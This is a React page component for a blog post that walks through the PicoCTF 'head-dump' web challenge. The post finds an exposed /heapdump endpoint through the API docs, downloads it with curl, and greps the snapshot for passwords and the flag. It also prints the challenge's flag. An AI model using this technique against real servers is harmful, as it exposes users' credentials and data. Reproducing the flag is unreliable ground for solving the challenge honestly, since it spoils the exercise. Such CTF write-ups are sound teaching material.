import { Calendar, Tag, User, ArrowLeft, ExternalLink } from 'lucide-react';
import { Button } from '@/components/ui/button';

const relatedPosts = [
  {
    title: 'Text and Typography',
    category: 'blog',
    tags: ['markdown', 'typography'],
    link: '/blogs/text-typography'
  },
  {
    title: 'OverTheWire Bandit Level 0-10',
    category: 'blog', 
    tags: ['OverTheWire', 'Linux'],
    link: '/blogs/otw-bandit-0-10'
  },
  {
    title: 'Digital Forensics with Autopsy',
    category: 'blog',
    tags: ['forensics', 'autopsy'],
    link: '/blogs/forensics-autopsy'
  }
];

export default function HeadDump() {
  return (
    <div className="min-h-screen">
      {/* Back button */}
      <div className="mb-6">
        <Button variant="ghost" className="gap-2" onClick={() => window.history.back()}>
          <ArrowLeft className="h-4 w-4" />
          Back
        </Button>
      </div>

      {/* Header */}
      <header className="mb-8">
        <h1 className="text-4xl font-bold mb-4">head-dump</h1>
        
        {/* Meta information */}
        <div className="flex flex-wrap items-center gap-4 text-sm text-muted-foreground mb-4">
          <div className="flex items-center gap-2">
            <Calendar className="h-4 w-4" />
            <span>Jan 15, 2025</span>
          </div>
          <div className="flex items-center gap-2">
            <User className="h-4 w-4" />
            <span>Raj Kumar</span>
          </div>
        </div>

        {/* Tags */}
        <div className="flex flex-wrap gap-2 mb-6">
          {['PicoCTF', 'CTF', 'Web Exploitation', 'easy'].map((tag) => (
            <span 
              key={tag}
              className="inline-flex items-center gap-1 px-3 py-1 bg-primary/10 text-primary rounded-full text-sm border border-primary/20"
            >
              <Tag className="h-3 w-3" />
              {tag}
            </span>
          ))}
        </div>
      </header>

      {/* Content */}
      <article className="prose prose-invert max-w-none">
        <div className="bg-card rounded-lg p-8 border border-border">
          
          {/* Description */}
          <section className="mb-8">
            <h2 className="text-2xl font-semibold mb-4 text-primary">🔎 Description</h2>
            <div className="bg-secondary/20 rounded-lg p-4 border-l-4 border-primary">
              <p className="text-foreground leading-relaxed">
                Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.
              </p>
              <p className="text-foreground leading-relaxed mt-2">
                The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server's memory, where a secret flag is hidden.
              </p>
            </div>
          </section>

          {/* Solution */}
          <section className="mb-8">
            <h2 className="text-2xl font-semibold mb-4 text-primary">🛠️ Solution</h2>
            <div className="bg-muted/20 rounded-lg p-4 mb-4">
              <p className="text-sm text-muted-foreground mb-2">
                <strong>Reference by:</strong> instagram @blackbat.terminal
              </p>
            </div>

            {/* Concept */}
            <h3 className="text-xl font-semibold mb-3 text-accent">💡 Concept</h3>
            <ul className="list-disc list-inside space-y-2 mb-6 text-muted-foreground">
              <li>Don't let attackers steal your passwords and API key through a heap dump.</li>
              <li>A heap dump shows everything our server holding in memory including all sensitive data.</li>
              <li>If an attacker gains access, they can use tools like <code className="bg-secondary px-2 py-1 rounded text-primary font-mono">"grep"</code> to search for keywords like usernames or passwords and potentially steal our data.</li>
              <li>So make sure heap dumps aren't publicly accessible.</li>
            </ul>

            {/* Process */}
            <h3 className="text-xl font-semibold mb-3 text-accent">⚡ Process</h3>
            
            <div className="space-y-6">
              {/* Step 1 */}
              <div className="bg-card border border-border rounded-lg p-4">
                <h4 className="font-semibold text-primary mb-2">Step 1: Check where the data was exposed to the user</h4>
                <p className="text-muted-foreground">
                  In here the <strong className="text-foreground">#API Documentation</strong> (link is there) moves user to API information (<code className="bg-secondary px-2 py-1 rounded font-mono">/api-docs</code> directory)
                </p>
              </div>

              {/* Step 2 */}
              <div className="bg-card border border-border rounded-lg p-4">
                <h4 className="font-semibold text-primary mb-2">Step 2: /api-docs gives information of API key through a heap dump</h4>
                <p className="text-muted-foreground mb-3">You can observe:</p>
                
                <div className="bg-secondary/10 rounded-lg p-4 font-mono text-sm">
                  <div className="text-primary font-semibold mb-2">picoCTF News API</div>
                  
                  <div className="mb-4">
                    <div className="text-accent font-medium">Free:</div>
                    <div className="ml-4 text-muted-foreground">(API endpoints for navigating the website.)</div>
                    <ul className="ml-8 space-y-1">
                      <li>GET - / (welcome page)</li>
                      <li>GET - /about (About us)</li>
                      <li>GET - /services (Services)</li>
                    </ul>
                  </div>

                  <div className="mb-4">
                    <div className="text-accent font-medium">Posts:</div>
                    <div className="ml-4 text-muted-foreground">(API endpoints for managing posts.)</div>
                    <ul className="ml-8 space-y-1">
                      <li>GET - /api/posts (gets all posts)</li>
                      <li>POST - /api/posts (Create a new post)</li>
                      <li>GET - /api/posts/{'{id}'} (get a post by ID)</li>
                      <li>PUT - /api/posts/{'{id}'} (update a post by ID)</li>
                      <li>DELETE - /api/posts/{'{id}'} (delete a post by ID)</li>
                    </ul>
                  </div>

                  <div>
                    <div className="text-accent font-medium">Diagnosing:</div>
                    <ul className="ml-8">
                      <li className="text-primary">GET - /heapdump (Diagnosing the memory allocation)</li>
                    </ul>
                  </div>
                </div>
              </div>

              {/* Step 3 */}
              <div className="bg-card border border-border rounded-lg p-4">
                <h4 className="font-semibold text-primary mb-2">Step 3: /heapdump</h4>
                <ul className="list-disc list-inside space-y-2 text-muted-foreground">
                  <li>Parameters (click "try it out" button)</li>
                  <li>You can observe "no parameters" and "Execute" button</li>
                  <li>Click "Execute" button</li>
                  <li>You can observe Responses</li>
                </ul>
                
                <div className="mt-4 bg-secondary/10 rounded-lg p-4">
                  <div className="text-sm font-medium mb-2">Curl:</div>
                  <code className="text-primary font-mono text-sm">
                    curl -X 'GET' \<br/>
                    &nbsp;&nbsp;'http://verbal-sleep.picoctf.net:63348/heapdump' \<br/>
                    &nbsp;&nbsp;-H 'accept: */*'
                  </code>
                </div>
              </div>

              {/* Step 4 */}
              <div className="bg-card border border-border rounded-lg p-4">
                <h4 className="font-semibold text-primary mb-2">Step 4: Check Server Response</h4>
                <div className="space-y-3">
                  <div>
                    <span className="font-medium">Response body:</span> {'{Download file}'} download file.
                    <br/>
                    <code className="bg-secondary px-2 py-1 rounded font-mono text-sm">filename="heapdump-1745502806827.heapsnapshot"</code>
                  </div>
                  
                  <div>
                    <span className="font-medium">Response headers:</span>
                    <div className="bg-secondary/10 rounded-lg p-3 mt-2 font-mono text-xs">
                      accept-ranges: bytes<br/>
                      cache-control: public,max-age=0<br/>
                      connection: keep-alive<br/>
                      content-disposition: attachment; filename="heapdump-1745502806827.heapsnapshot"<br/>
                      content-length: 9068975<br/>
                      content-type: application/octet-stream<br/>
                      date: Thu,24 Apr 2025 13:53:29 GMT<br/>
                      etag: W/"8a61af-19668132da8"<br/>
                      keep-alive: timeout=5<br/>
                      last-modified: Thu,24 Apr 2025 13:53:29 GMT<br/>
                      x-powered-by: Express
                    </div>
                  </div>
                </div>
              </div>

              {/* Step 5 */}
              <div className="bg-card border border-border rounded-lg p-4">
                <h4 className="font-semibold text-primary mb-2">Step 5: By using "grep" we find data</h4>
                <div className="space-y-3">
                  <div className="bg-secondary/10 rounded-lg p-3">
                    <code className="font-mono text-sm">
                      $ grep "name" heapdump-1745500193409.heapsnapshot
                    </code>
                    <p className="text-muted-foreground text-sm mt-2">- gives all usernames with passwords.</p>
                  </div>
                  
                  <div className="bg-primary/10 border border-primary/20 rounded-lg p-3">
                    <div className="font-medium text-primary mb-2">Finally:</div>
                    <code className="font-mono text-sm">
                      $ grep "picoCTF" heapdump-1745500193409.heapsnapshot<br/>
                      <span className="text-primary font-bold">picoCTF{'{Pat!3nt_15_Th3_K3y_388d10f7}'}</span>
                    </code>
                  </div>
                </div>
              </div>
            </div>
          </section>

          {/* Conclusion */}
          <section className="mb-8">
            <h2 className="text-2xl font-semibold mb-4 text-primary">🎯 Conclusion</h2>
            <div className="bg-accent/10 rounded-lg p-4 border-l-4 border-accent">
              <ul className="space-y-2 text-foreground">
                <li><code className="bg-secondary px-2 py-1 rounded font-mono">url/api-doc</code> : gives API key data</li>
                <li><code className="bg-secondary px-2 py-1 rounded font-mono">/heapdump</code> : In API /heapdump gives users data file by executing</li>
                <li><code className="bg-secondary px-2 py-1 rounded font-mono">grep</code> : It is a tool used to search data in files</li>
              </ul>
            </div>
          </section>
        </div>
      </article>

      {/* Related Posts */}
      <section className="mt-12">
        <h2 className="text-2xl font-semibold mb-6">📚 Related Posts</h2>
        <div className="grid md:grid-cols-3 gap-4">
          {relatedPosts.map((post, index) => (
            <a 
              key={index}
              href={post.link}
              className="block bg-card rounded-lg p-4 border border-border hover:border-primary/50 transition-all duration-300 hover:shadow-elegant group"
            >
              <h3 className="font-semibold mb-2 group-hover:text-primary transition-colors">
                {post.title}
              </h3>
              <div className="flex flex-wrap gap-1 mb-2">
                {post.tags.map((tag) => (
                  <span 
                    key={tag}
                    className="px-2 py-1 bg-secondary/50 text-xs rounded"
                  >
                    {tag}
                  </span>
                ))}
              </div>
              <div className="flex items-center gap-1 text-xs text-muted-foreground">
                <ExternalLink className="h-3 w-3" />
                <span>{post.category}</span>
              </div>
            </a>
          ))}
        </div>
      </section>
    </div>
  );
}